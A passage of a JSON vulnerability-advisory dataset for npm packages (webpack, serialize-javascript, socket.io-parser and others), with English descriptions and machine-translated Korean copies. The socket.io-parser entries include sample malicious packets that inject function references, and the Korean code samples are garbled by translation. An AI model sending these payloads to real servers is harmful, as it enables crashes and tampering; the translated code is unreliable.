    "updatedAt": "2023-03-15T19:18:37Z",
    "publishedAt": "2023-03-09T06:30:21Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-26109\nhttps://security.snyk.io/vuln/SNYK-JS-NODEBLUETOOTHSERIALPORT-3311820\nhttps://github.com/advisories/GHSA-9jh3-4pc9-hq29",
    "name": "node-bluetooth-serial-port",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 2.2.7",
    "descriptionKR": "node-bluetooth-serial-port 패키지의 모든 버전은 부적절한 사용자 입력 길이 유효성 검사로 인해 findSerialPortChannel 메서드를 통한 버퍼 오버플로에 취약합니다."
  },
  {
    "description": "Webpack 5 before 5.76.0 does not avoid cross-realm object access. ImportParserPlugin.js mishandles the magic comment feature. An attacker who controls a property of an untrusted object can obtain access to the real global object.",
    "identifiers": "GHSA : GHSA-hc6q-2mpp-qw7j\nCVE : CVE-2023-28154",
    "severity": "HIGH",
    "updatedAt": "2023-03-14T15:03:09Z",
    "publishedAt": "2023-03-13T03:30:15Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-28154\nhttps://github.com/webpack/webpack/pull/16500\nhttps://github.com/webpack/webpack/compare/v5.75.0...v5.76.0\nhttps://github.com/advisories/GHSA-hc6q-2mpp-qw7j",
    "name": "webpack",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.0.0, < 5.76.0",
    "identifier": "5.76.0",
    "descriptionKR": "5.76.0 이전의 Webpack 5는 영역 간 객체 액세스를 피하지 않습니다. ImportParserPlugin.js는 매직 댓글 기능을 잘못 처리합니다. 신뢰할 수 없는 개체의 속성을 제어하는 ​​공격자는 실제 전역 개체에 대한 액세스 권한을 얻을 수 있습니다."
  },
  {
    "description": "The css-what package 4.0.0 through 5.0.0 for Node.js does not ensure that attribute parsing has Linear Time Complexity relative to the size of the input.",
    "identifiers": "GHSA : GHSA-q8pj-2vqx-8ggc\nCVE : CVE-2021-33587",
    "severity": "HIGH",
    "updatedAt": "2023-03-13T23:38:16Z",
    "publishedAt": "2021-06-07T22:11:39Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-33587\nhttps://github.com/fb55/css-what/commit/4cdaacfd0d4b6fd00614be030da0dea6c2994655\nhttps://github.com/fb55/css-what/releases/tag/v5.0.1\nhttps://security.netapp.com/advisory/ntap-20210706-0007/\nhttps://lists.debian.org/debian-lts-announce/2023/03/msg00001.html\nhttps://github.com/advisories/GHSA-q8pj-2vqx-8ggc",
    "name": "css-what",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0.0, <= 5.0.0",
    "identifier": "5.0.1",
    "descriptionKR": "Node.js용 css-what 패키지 4.0.0~5.0.0은 속성 구문 분석이 입력 크기에 비해 선형 시간 복잡도를 갖도록 보장하지 않습니다."
  },
  {
    "description": "@rkesters/gnuplot is an easy to use node module to draw charts using gnuplot and ps2pdf. The trim-newlines package before 3.0.1 and 4.x before 4.0.1 for Node.js has an issue related to regular expression denial-of-service (ReDoS) for the .end() method.",
    "identifiers": "GHSA : GHSA-7p7h-4mm5-852v\nCVE : CVE-2021-33623",
    "severity": "HIGH",
    "updatedAt": "2023-03-13T23:31:28Z",
    "publishedAt": "2021-06-07T22:10:39Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-33623\nhttps://github.com/sindresorhus/trim-newlines/commit/25246c6ce5eea1c82d448998733a6302a4350d91\nhttps://github.com/sindresorhus/trim-newlines/releases/tag/v4.0.1\nhttps://www.npmjs.com/package/trim-newlines\nhttps://security.netapp.com/advisory/ntap-20210702-0007/\nhttps://lists.debian.org/debian-lts-announce/2022/12/msg00033.html\nhttps://github.com/sindresorhus/trim-newlines/commit/b10d5f4afef832b16bc56d49fc52c68cbd403869\nhttps://github.com/advisories/GHSA-7p7h-4mm5-852v",
    "name": "trim-newlines",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 4.0.0",
    "identifier": "4.0.1",
    "descriptionKR": "@rkesters/gnuplot은 gnuplot 및 ps2pdf를 사용하여 차트를 그리는 사용하기 쉬운 노드 모듈입니다. Node.js용 3.0.1 이전의 trim-newlines 패키지 및 4.0.1 이전의 4.x에는 .end() 메서드에 대한 정규식 서비스 거부(ReDoS)와 관련된 문제가 있습니다."
  },
  {
    "description": "@rkesters/gnuplot is an easy to use node module to draw charts using gnuplot and ps2pdf. The trim-newlines package before 3.0.1 and 4.x before 4.0.1 for Node.js has an issue related to regular expression denial-of-service (ReDoS) for the .end() method.",
    "identifiers": "GHSA : GHSA-7p7h-4mm5-852v\nCVE : CVE-2021-33623",
    "severity": "HIGH",
    "updatedAt": "2023-03-13T23:31:28Z",
    "publishedAt": "2021-06-07T22:10:39Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-33623\nhttps://github.com/sindresorhus/trim-newlines/commit/25246c6ce5eea1c82d448998733a6302a4350d91\nhttps://github.com/sindresorhus/trim-newlines/releases/tag/v4.0.1\nhttps://www.npmjs.com/package/trim-newlines\nhttps://security.netapp.com/advisory/ntap-20210702-0007/\nhttps://lists.debian.org/debian-lts-announce/2022/12/msg00033.html\nhttps://github.com/sindresorhus/trim-newlines/commit/b10d5f4afef832b16bc56d49fc52c68cbd403869\nhttps://github.com/advisories/GHSA-7p7h-4mm5-852v",
    "name": "trim-newlines",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.0.1",
    "identifier": "3.0.1",
    "descriptionKR": "@rkesters/gnuplot은 gnuplot 및 ps2pdf를 사용하여 차트를 그리는 사용하기 쉬운 노드 모듈입니다. Node.js용 3.0.1 이전의 trim-newlines 패키지 및 4.0.1 이전의 4.x에는 .end() 메서드에 대한 정규식 서비스 거부(ReDoS)와 관련된 문제가 있습니다."
  },
  {
    "description": "serialize-javascript prior to 3.1.0 allows remote attackers to inject arbitrary code via the function \"deleteFunctions\" within \"index.js\". \n\nAn object such as `{\"foo\": /1\"/, \"bar\": \"a\\\"@__R-<UID>-0__@\"}` was serialized as `{\"foo\": /1\"/, \"bar\": \"a\\/1\"/}`, which allows an attacker to escape the `bar` key. This requires the attacker to control the values of both `foo` and `bar` and guess the value of `<UID>`. The UID has a keyspace of approximately 4 billion making it a realistic network attack.",
    "identifiers": "GHSA : GHSA-hxcc-f52p-wc94\nCVE : CVE-2020-7660",
    "severity": "HIGH",
    "updatedAt": "2023-03-13T23:28:40Z",
    "publishedAt": "2020-08-11T17:21:13Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-7660\nhttps://github.com/yahoo/serialize-javascript/commit/f21a6fb3ace2353413761e79717b2d210ba6ccbd\nhttps://github.com/advisories/GHSA-hxcc-f52p-wc94",
    "name": "serialize-javascript",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.1.0",
    "identifier": "3.1.0",
    "descriptionKR": "3.1.0 이전의 serialize-javascript를 사용하면 원격 공격자가 \"index.js\" 내의 \"deleteFunctions\" 함수를 통해 임의의 코드를 주입할 수 있습니다.\n\n`{\"foo\": /1\"/, \"bar\": \"a\\\"@__R-<UID>-0__@\"}`와 같은 개체가 `{\"foo\": /1\"/, \"로 직렬화되었습니다. bar\": \"a\\/1\"/}`, 공격자가 `bar` 키를 벗어날 수 있습니다. 이렇게 하려면 공격자가 `foo` 및 `bar` 값을 모두 제어하고 `<UID 값을 추측해야 합니다. >`.UID는 약 40억 개의 키스페이스를 가지고 있어 현실적인 네트워크 공격입니다."
  },
  {
    "description": "Due to improper type validation in the `socket.io-parser` library (which is used by the `socket.io` and `socket.io-client` packages to encode and decode Socket.IO packets), it is possible to overwrite the _placeholder object which allows an attacker to place references to functions at arbitrary places in the resulting query object.\n\nExample:\n\n```js\nconst decoder = new Decoder();\n\ndecoder.on(\"decoded\", (packet) => {\n console.log(packet.data); // prints [ 'hello', [Function: splice] ]\n})\n\ndecoder.add('51-[\"hello\",{\"_placeholder\":true,\"num\":\"splice\"}]');\ndecoder.add(Buffer.from(\"world\"));\n```\n\nThis bubbles up in the `socket.io` package:\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n // here, \"val\" could be a function instead of a buffer\n });\n});\n```\n\n:warning: IMPORTANT NOTE :warning:\n\nYou need to make sure that the payload that you received from the client is actually a `Buffer` object:\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n if (!Buffer.isBuffer(val)) {\n socket.disconnect();\n return;\n }\n // ...\n });\n});\n```\n\n**If that's already the case, then you are not impacted by this issue, and there is no way an attacker could make your server crash (or escalate privileges, ...).**\n\nExample of values that could be sent by a malicious user:\n\n- a number that is out of bounds\n\nSample packet: `451-[\"hello\",{\"_placeholder\":true,\"num\":10}]`\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n // val is `undefined`\n });\n});\n```\n\n- a value that is not a number, like `undefined`\n\nSample packet: `451-[\"hello\",{\"_placeholder\":true,\"num\":undefined}]`\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n // val is `undefined`\n });\n});\n```\n\n- a string that is part of the prototype of `Array`, like \"push\"\n\nSample packet: `451-[\"hello\",{\"_placeholder\":true,\"num\":\"push\"}]`\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n // val is a reference to the \"push\" function\n });\n});\n```\n\n- a string that is part of the prototype of `Object`, like \"hasOwnProperty\"\n\nSample packet: `451-[\"hello\",{\"_placeholder\":true,\"num\":\"hasOwnProperty\"}]`\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n // val is a reference to the \"hasOwnProperty\" function\n });\n});\n```\n\nThis should be fixed by:\n\n- https://github.com/socketio/socket.io-parser/commit/b5d0cb7dc56a0601a09b056beaeeb0e43b160050, included in `socket.io-parser@4.2.1`\n- https://github.com/socketio/socket.io-parser/commit/b559f050ee02bd90bd853b9823f8de7fa94a80d4, included in `socket.io-parser@4.0.5`\n- https://github.com/socketio/socket.io-parser/commit/04d23cecafe1b859fb03e0cbf6ba3b74dff56d14, included in `socket.io-parser@3.4.2`\n- https://github.com/socketio/socket.io-parser/commit/fb21e422fc193b34347395a33e0f625bebc09983, included in `socket.io-parser@3.3.3`\n\n### Dependency analysis for the `socket.io` package\n\n| `socket.io` version | `socket.io-parser` version | Covered? |\n|---------------------|---------------------------------------------------------------------------------------------------------|------------------------|\n| `4.5.2...latest` | `~4.2.0` ([ref](https://github.com/socketio/socket.io/commit/9890b036cf942f6b6ad2afeb6a8361c32cd5d528)) | Yes :heavy_check_mark: |\n| `4.1.3...4.5.1` | `~4.0.4` ([ref](https://github.com/socketio/socket.io/commit/7c44893d7878cd5bba1eff43150c3e664f88fb57)) | Yes :heavy_check_mark: |\n| `3.0.5...4.1.2` | `~4.0.3` ([ref](https://github.com/socketio/socket.io/commit/752dfe3b1e5fecda53dae899b4a39e6fed5a1a17)) | Yes :heavy_check_mark: |\n| `3.0.0...3.0.4` | `~4.0.1` ([ref](https://github.com/socketio/socket.io/commit/1af3267e3f5f7884214cf2ca4d5282d620092fb0)) | Yes :heavy_check_mark: |\n| `2.3.0...2.5.0` | `~3.4.0` ([ref](https://github.com/socketio/socket.io/commit/cf39362014f5ff13a17168b74772c43920d6e4fd)) | Yes :heavy_check_mark: |\n\n\n### Dependency analysis for the `socket.io-client` package\n\n| `socket.io-client` version | `socket.io-parser` version | Covered? |\n|----------------------------|----------------------------------------------------------------------------------------------------------------|------------------------------------|\n| `4.5.0...latest` | `~4.2.0` ([ref](https://github.com/socketio/socket.io-client/commit/b862924b7f1720979e5db2f0154906b305d420e3)) | Yes :heavy_check_mark: |\n| `4.3.0...4.4.1` | `~4.1.1` ([ref](https://github.com/socketio/socket.io-client/commit/91b948b8607166fcc79f028a6428819277214188)) | No, but the impact is very limited |\n| `3.1.0...4.2.0` | `~4.0.4` ([ref](https://github.com/socketio/socket.io-client/commit/5d9b4eb42b1f5778e6f033096694acb331b132c4)) | Yes :heavy_check_mark: |\n| `3.0.5` | `~4.0.3` ([ref](https://github.com/socketio/socket.io-client/commit/cf9fc358365cc15a41260a51dc186c881bf086ca)) | Yes :heavy_check_mark: |\n| `3.0.0...3.0.4` | `~4.0.1` ([ref](https://github.com/socketio/socket.io-client/commit/b7e07ba633ceb9c1dc94cc894c10b9bfca536c7a)) | Yes :heavy_check_mark: |\n| `2.2.0...2.5.0` | `~3.3.0` ([ref](https://github.com/socketio/socket.io-client/commit/06e9a4ca2621176c30c352b2ba8b34fa42b8d0ba)) | Yes :heavy_check_mark: |\n",
    "identifiers": "GHSA : GHSA-qm95-pgcg-qqfq\nCVE : CVE-2022-2421",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-13T23:27:28Z",
    "publishedAt": "2022-10-26T12:00:28Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-2421\nhttps://csirt.divd.nl/cases/DIVD-2022-00045\nhttps://csirt.divd.nl/cves/CVE-2022-2421\nhttps://github.com/socketio/socket.io-parser/commit/b559f050ee02bd90bd853b9823f8de7fa94a80d4\nhttps://github.com/socketio/socket.io-parser/commit/b5d0cb7dc56a0601a09b056beaeeb0e43b160050\nhttps://github.com/socketio/socket.io-parser/commit/04d23cecafe1b859fb03e0cbf6ba3b74dff56d14\nhttps://github.com/socketio/socket.io-parser/commit/fb21e422fc193b34347395a33e0f625bebc09983\nhttps://csirt.divd.nl/CVE-2022-2421\nhttps://csirt.divd.nl/DIVD-2022-00045\nhttps://github.com/advisories/GHSA-qm95-pgcg-qqfq",
    "name": "socket.io-parser",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.4.0, < 3.4.2",
    "identifier": "3.4.2",
    "descriptionKR": "`socket.io-parser` 라이브러리(`socket.io` 및 `socket.io-client` 패키지에서 Socket.IO 패킷을 인코딩 및 디코딩하는 데 사용됨)의 잘못된 유형 유효성 검사로 인해 덮어쓸 수 있습니다. 공격자가 결과 쿼리 개체의 임의 위치에 함수에 대한 참조를 배치할 수 있도록 하는 _placeholder 개체.\n\n예:\n\n```js\nconst 디코더 = new Decoder();\n\ndecoder.on(\"디코딩됨\", (패킷) => {\n console.log(패킷.데이터); // 출력 [ 'hello', [Function: splice] ]\n})\n\ndecoder.add('51-[\"hello\",{\"_placeholder\":true,\"num\":\"splice\"}]');\ndecoder.add(Buffer.from(\"세계\"));\n```\n\n이것은 `socket.io` 패키지에서 나타납니다:\n\n```js\nio.on(\"연결\", (소켓) => {\n socket.on(\"hello\", (val) => {\n // 여기서 \"val\"은 버퍼가 아닌 함수일 수 있습니다.\n });\n});\n```\n\n:경고: 중요 사항 :경고:\n\n클라이언트로부터 받은 페이로드가 실제로 `Buffer` 개체인지 확인해야 합니다.\n\n```js\nio.on(\"연결\", (소켓) => {\n socket.on(\"hello\", (val) => {\n if (!Buffer.isBuffer(val)) {\n 소켓.연결해제();\n 반품;\n }\n // ...\n });\n});\n```\n\n**이미 그런 경우라면 이 문제의 영향을 받지 않으며 공격자가 서버를 중단(또는 권한 상승 등)할 수 있는 방법이 없습니다.**\n\n악의적인 사용자가 보낼 수 있는 값의 예:\n\n- 범위를 벗어난 숫자\n\n샘플 패킷: `451-[\"hello\",{\"_placeholder\":true,\"num\":10}]`\n\n```js\nio.on(\"연결\", (소켓) => {\n socket.on(\"hello\", (val) => {\n // 값은 `정의되지 않음`입니다.\n });\n});\n```\n\n- `undefined`와 같이 숫자가 아닌 값\n\n샘플 패킷: `451-[\"hello\",{\"_placeholder\":true,\"num\":undefined}]`\n\n```js\nio.on(\"연결\", (소켓) => {\n socket.on(\"hello\", (val) => {\n // 값은 `정의되지 않음`입니다.\n });\n});\n```\n\n- \"push\"와 같이 `Array` 프로토타입의 일부인 문자열\n\n샘플 패킷: `451-[\"hello\",{\"_placeholder\":true,\"num\":\"push\"}]`\n\n```js\nio.on(\"연결\", (소켓) => {\n socket.on(\"hello\", (val) => {\n // val은 \"푸시\" 함수에 대한 참조입니다.\n });\n});\n```\n\n- \"hasOwnProperty\"와 같이 `Object` 프로토타입의 일부인 문자열\n\n샘플 패킷: `451-[\"hello\",{\"_placeholder\":true,\"num\":\"hasOwnProperty\"}]`\n\n```js\nio.on(\"연결\", (소켓) => {\n socket.on(\"hello\", (val) => {\n // val은 \"hasOwnProperty\" 함수에 대한 참조입니다.\n });\n});\n```\n\n이것은 다음과 같이 수정해야 합니다.\n\n- https://github.com/socketio/socket.io-parser/commit/b5d0cb7dc56a0601a09b056beaeeb0e43b160050, `socket.io-parser@4.2.1`에 포함됨\n- https://github.com/socketio/socket.io-parser/commit/b559f050ee02bd90bd853b9823f8de7fa94a80d4, `socket.io-parser@4.0.5`에 포함됨\n- https://github.com/socketio/socket.io-parser/commit/04d23cecafe1b859fb03e0cbf6ba3b74dff56d14, `socket.io-parser@3.4.2`에 포함됨\n- https://github.com/socketio/socket.io-parser/commit/fb21e422fc193b34347395a33e0f625bebc09983, `socket.io-parser@3.3.3`에 포함됨\n\n### `socket.io` 패키지에 대한 종속성 분석\n\n| `socket.io` 버전 | `socket.io-parser` 버전 | 덮여? |\n|------|------------------------------------------ -------------------------------------------------- ----------------------------|------ ---|\n| `4.5.2...최신` | `~4.2.0` ([ref](https://github.com/socketio/socket.io/commit/9890b036cf942f6b6ad2afeb6a8361c32cd5d528)) | 예 :heavy_check_mark: |\n| `4.1.3...4.5.1` | `~4.0.4` ([ref](https://github.com/socketio/socket.io/commit/7c44893d7878cd5bba1eff43150c3e664f88fb57)) | 예 :heavy_check_mark: |\n| `3.0.5...4.1.2` | `~4.0.3` ([ref](https://github.com/socketio/socket.io/commit/752dfe3b1e5fecda53dae899b4a39e6fed5a1a17)) | 예 :heavy_check_mark: |\n| `3.0.0...3.0.4` | `~4.0.1` ([ref](https://github.com/socketio/socket.io/commit/1af3267e3f5f7884214cf2ca4d5282d620092fb0)) | 예 :heavy_check_mark: |\n| `2.3.0...2.5.0` | `~3.4.0` ([ref](https://github.com/socketio/socket.io/commit/cf39362014f5ff13a17168b74772c43920d6e4fd)) | 예 :heavy_check_mark: |\n\n\n### `socket.io-client` 패키지에 대한 종속성 분석\n\n| `socket.io-client` 버전 | `socket.io-parser` 버전 | 덮여? |\n|-------------------------------------------|----- -------------------------------------------------- -------------------------------------------|------- -----------------------------|\n| `4.5.0...최신` | `~4.2.0` ([ref](https://github.com/socketio/socket.io-client/commit/b862924b7f1720979e5db2f0154906b305d420e3)) | 예 :heavy_check_mark: |\n| `4.3.0...4.4.1` | `~4.1.1` ([ref](https://github.com/socketio/socket.io-client/commit/91b948b8607166fcc79f028a6428819277214188)) | 아니요. 하지만 영향은 매우 제한적입니다. |\n| `3.1.0...4.2.0` | `~4.0.4` ([ref](https://github.com/socketio/socket.io-client/commit/5d9b4eb42b1f5778e6f033096694acb331b132c4)) | 예 :heavy_check_mark: |\n| `3.0.5` | `~4.0.3` ([ref](https://github.com/socketio/socket.io-client/commit/cf9fc358365cc15a41260a51dc186c881bf086ca)) | 예 :heavy_check_mark: |\n| `3.0.0...3.0.4` | `~4.0.1` ([ref](https://github.com/socketio/socket.io-client/commit/b7e07ba633ceb9c1dc94cc894c10b9bfca536c7a)) | 예 :heavy_check_mark: |\n| `2.2.0...2.5.0` | `~3.3.0` ([ref](https://github.com/socketio/socket.io-client/commit/06e9a4ca2621176c30c352b2ba8b34fa42b8d0ba)) | 예 :heavy_check_mark: |"
  },
  {
    "description": "Due to improper type validation in the `socket.io-parser` library (which is used by the `socket.io` and `socket.io-client` packages to encode and decode Socket.IO packets), it is possible to overwrite the _placeholder object which allows an attacker to place references to functions at arbitrary places in the resulting query object.\n\nExample:\n\n```js\nconst decoder = new Decoder();\n\ndecoder.on(\"decoded\", (packet) => {\n console.log(packet.data); // prints [ 'hello', [Function: splice] ]\n})\n\ndecoder.add('51-[\"hello\",{\"_placeholder\":true,\"num\":\"splice\"}]');\ndecoder.add(Buffer.from(\"world\"));\n```\n\nThis bubbles up in the `socket.io` package:\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n // here, \"val\" could be a function instead of a buffer\n });\n});\n```\n\n:warning: IMPORTANT NOTE :warning:\n\nYou need to make sure that the payload that you received from the client is actually a `Buffer` object:\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n if (!Buffer.isBuffer(val)) {\n socket.disconnect();\n return;\n }\n // ...\n });\n});\n```\n\n**If that's already the case, then you are not impacted by this issue, and there is no way an attacker could make your server crash (or escalate privileges, ...).**\n\nExample of values that could be sent by a malicious user:\n\n- a number that is out of bounds\n\nSample packet: `451-[\"hello\",{\"_placeholder\":true,\"num\":10}]`\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n // val is `undefined`\n });\n});\n```\n\n- a value that is not a number, like `undefined`\n\nSample packet: `451-[\"hello\",{\"_placeholder\":true,\"num\":undefined}]`\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n // val is `undefined`\n });\n});\n```\n\n- a string that is part of the prototype of `Array`, like \"push\"\n\nSample packet: `451-[\"hello\",{\"_placeholder\":true,\"num\":\"push\"}]`\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n // val is a reference to the \"push\" function\n });\n});\n```\n\n- a string that is part of the prototype of `Object`, like \"hasOwnProperty\"\n\nSample packet: `451-[\"hello\",{\"_placeholder\":true,\"num\":\"hasOwnProperty\"}]`\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n // val is a reference to the \"hasOwnProperty\" function\n });\n});\n```\n\nThis should be fixed by:\n\n- https://github.com/socketio/socket.io-parser/commit/b5d0cb7dc56a0601a09b056beaeeb0e43b160050, included in `socket.io-parser@4.2.1`\n- https://github.com/socketio/socket.io-parser/commit/b559f050ee02bd90bd853b9823f8de7fa94a80d4, included in `socket.io-parser@4.0.5`\n- https://github.com/socketio/socket.io-parser/commit/04d23cecafe1b859fb03e0cbf6ba3b74dff56d14, included in `socket.io-parser@3.4.2`\n- https://github.com/socketio/socket.io-parser/commit/fb21e422fc193b34347395a33e0f625bebc09983, included in `socket.io-parser@3.3.3`\n\n### Dependency analysis for the `socket.io` package\n\n| `socket.io` version | `socket.io-parser` version | Covered? |\n|---------------------|---------------------------------------------------------------------------------------------------------|------------------------|\n| `4.5.2...latest` | `~4.2.0` ([ref](https://github.com/socketio/socket.io/commit/9890b036cf942f6b6ad2afeb6a8361c32cd5d528)) | Yes :heavy_check_mark: |\n| `4.1.3...4.5.1` | `~4.0.4` ([ref](https://github.com/socketio/socket.io/commit/7c44893d7878cd5bba1eff43150c3e664f88fb57)) | Yes :heavy_check_mark: |\n| `3.0.5...4.1.2` | `~4.0.3` ([ref](https://github.com/socketio/socket.io/commit/752dfe3b1e5fecda53dae899b4a39e6fed5a1a17)) | Yes :heavy_check_mark: |\n| `3.0.0...3.0.4` | `~4.0.1` ([ref](https://github.com/socketio/socket.io/commit/1af3267e3f5f7884214cf2ca4d5282d620092fb0)) | Yes :heavy_check_mark: |\n| `2.3.0...2.5.0` | `~3.4.0` ([ref](https://github.com/socketio/socket.io/commit/cf39362014f5ff13a17168b74772c43920d6e4fd)) | Yes :heavy_check_mark: |\n\n\n### Dependency analysis for the `socket.io-client` package\n\n| `socket.io-client` version | `socket.io-parser` version | Covered? |\n|----------------------------|----------------------------------------------------------------------------------------------------------------|------------------------------------|\n| `4.5.0...latest` | `~4.2.0` ([ref](https://github.com/socketio/socket.io-client/commit/b862924b7f1720979e5db2f0154906b305d420e3)) | Yes :heavy_check_mark: |\n| `4.3.0...4.4.1` | `~4.1.1` ([ref](https://github.com/socketio/socket.io-client/commit/91b948b8607166fcc79f028a6428819277214188)) | No, but the impact is very limited |\n| `3.1.0...4.2.0` | `~4.0.4` ([ref](https://github.com/socketio/socket.io-client/commit/5d9b4eb42b1f5778e6f033096694acb331b132c4)) | Yes :heavy_check_mark: |\n| `3.0.5` | `~4.0.3` ([ref](https://github.com/socketio/socket.io-client/commit/cf9fc358365cc15a41260a51dc186c881bf086ca)) | Yes :heavy_check_mark: |\n| `3.0.0...3.0.4` | `~4.0.1` ([ref](https://github.com/socketio/socket.io-client/commit/b7e07ba633ceb9c1dc94cc894c10b9bfca536c7a)) | Yes :heavy_check_mark: |\n| `2.2.0...2.5.0` | `~3.3.0` ([ref](https://github.com/socketio/socket.io-client/commit/06e9a4ca2621176c30c352b2ba8b34fa42b8d0ba)) | Yes :heavy_check_mark: |\n",
    "identifiers": "GHSA : GHSA-qm95-pgcg-qqfq\nCVE : CVE-2022-2421",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-13T23:27:28Z",
    "publishedAt": "2022-10-26T12:00:28Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-2421\nhttps://csirt.divd.nl/cases/DIVD-2022-00045\nhttps://csirt.divd.nl/cves/CVE-2022-2421\nhttps://github.com/socketio/socket.io-parser/commit/b559f050ee02bd90bd853b9823f8de7fa94a80d4\nhttps://github.com/socketio/socket.io-parser/commit/b5d0cb7dc56a0601a09b056beaeeb0e43b160050\nhttps://github.com/socketio/socket.io-parser/commit/04d23cecafe1b859fb03e0cbf6ba3b74dff56d14\nhttps://github.com/socketio/socket.io-parser/commit/fb21e422fc193b34347395a33e0f625bebc09983\nhttps://csirt.divd.nl/CVE-2022-2421\nhttps://csirt.divd.nl/DIVD-2022-00045\nhttps://github.com/advisories/GHSA-qm95-pgcg-qqfq",
    "name": "socket.io-parser",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.3.3",
    "identifier": "3.3.3",
    "descriptionKR": "`socket.io-parser` 라이브러리(`socket.io` 및 `socket.io-client` 패키지에서 Socket.IO 패킷을 인코딩 및 디코딩하는 데 사용됨)의 잘못된 유형 유효성 검사로 인해 덮어쓸 수 있습니다. 공격자가 결과 쿼리 개체의 임의 위치에 함수에 대한 참조를 배치할 수 있도록 하는 _placeholder 개체.\n\n예:\n\n```js\nconst 디코더 = new Decoder();\n\ndecoder.on(\"디코딩됨\", (패킷) => {\n console.log(패킷.데이터); // 출력 [ 'hello', [Function: splice] ]\n})\n\ndecoder.add('51-[\"hello\",{\"_placeholder\":true,\"num\":\"splice\"}]');\ndecoder.add(Buffer.from(\"세계\"));\n```\n\n이것은 `socket.io` 패키지에서 나타납니다:\n\n```js\nio.on(\"연결\", (소켓) => {\n socket.on(\"hello\", (val) => {\n // 여기서 \"val\"은 버퍼가 아닌 함수일 수 있습니다.\n });\n});\n```\n\n:경고: 중요 사항 :경고:\n\n클라이언트로부터 받은 페이로드가 실제로 `Buffer` 개체인지 확인해야 합니다.\n\n```js\nio.on(\"연결\", (소켓) => {\n socket.on(\"hello\", (val) => {\n if (!Buffer.isBuffer(val)) {\n 소켓.연결해제();\n 반품;\n }\n // ...\n });\n});\n```\n\n**이미 그런 경우라면 이 문제의 영향을 받지 않으며 공격자가 서버를 중단(또는 권한 상승 등)할 수 있는 방법이 없습니다.**\n\n악의적인 사용자가 보낼 수 있는 값의 예:\n\n- 범위를 벗어난 숫자\n\n샘플 패킷: `451-[\"hello\",{\"_placeholder\":true,\"num\":10}]`\n\n```js\nio.on(\"연결\", (소켓) => {\n socket.on(\"hello\", (val) => {\n // 값은 `정의되지 않음`입니다.\n });\n});\n```\n\n- `undefined`와 같이 숫자가 아닌 값\n\n샘플 패킷: `451-[\"hello\",{\"_placeholder\":true,\"num\":undefined}]`\n\n```js\nio.on(\"연결\", (소켓) => {\n socket.on(\"hello\", (val) => {\n // 값은 `정의되지 않음`입니다.\n });\n});\n```\n\n- \"push\"와 같이 `Array` 프로토타입의 일부인 문자열\n\n샘플 패킷: `451-[\"hello\",{\"_placeholder\":true,\"num\":\"push\"}]`\n\n```js\nio.on(\"연결\", (소켓) => {\n socket.on(\"hello\", (val) => {\n // val은 \"푸시\" 함수에 대한 참조입니다.\n });\n});\n```\n\n- \"hasOwnProperty\"와 같이 `Object` 프로토타입의 일부인 문자열\n\n샘플 패킷: `451-[\"hello\",{\"_placeholder\":true,\"num\":\"hasOwnProperty\"}]`\n\n```js\nio.on(\"연결\", (소켓) => {\n socket.on(\"hello\", (val) => {\n // val은 \"hasOwnProperty\" 함수에 대한 참조입니다.\n });\n});\n```\n\n이것은 다음과 같이 수정해야 합니다.\n\n- https://github.com/socketio/socket.io-parser/commit/b5d0cb7dc56a0601a09b056beaeeb0e43b160050, `socket.io-parser@4.2.1`에 포함됨\n- https://github.com/socketio/socket.io-parser/commit/b559f050ee02bd90bd853b9823f8de7fa94a80d4, `socket.io-parser@4.0.5`에 포함됨\n- https://github.com/socketio/socket.io-parser/commit/04d23cecafe1b859fb03e0cbf6ba3b74dff56d14, `socket.io-parser@3.4.2`에 포함됨\n- https://github.com/socketio/socket.io-parser/commit/fb21e422fc193b34347395a33e0f625bebc09983, `socket.io-parser@3.3.3`에 포함됨\n\n### `socket.io` 패키지에 대한 종속성 분석\n\n| `socket.io` 버전 | `socket.io-parser` 버전 | 덮여? |\n|------|------------------------------------------ -------------------------------------------------- ----------------------------|------ ---|\n| `4.5.2...최신` | `~4.2.0` ([ref](https://github.com/socketio/socket.io/commit/9890b036cf942f6b6ad2afeb6a8361c32cd5d528)) | 예 :heavy_check_mark: |\n| `4.1.3...4.5.1` | `~4.0.4` ([ref](https://github.com/socketio/socket.io/commit/7c44893d7878cd5bba1eff43150c3e664f88fb57)) | 예 :heavy_check_mark: |\n| `3.0.5...4.1.2` | `~4.0.3` ([ref](https://github.com/socketio/socket.io/commit/752dfe3b1e5fecda53dae899b4a39e6fed5a1a17)) | 예 :heavy_check_mark: |\n| `3.0.0...3.0.4` | `~4.0.1` 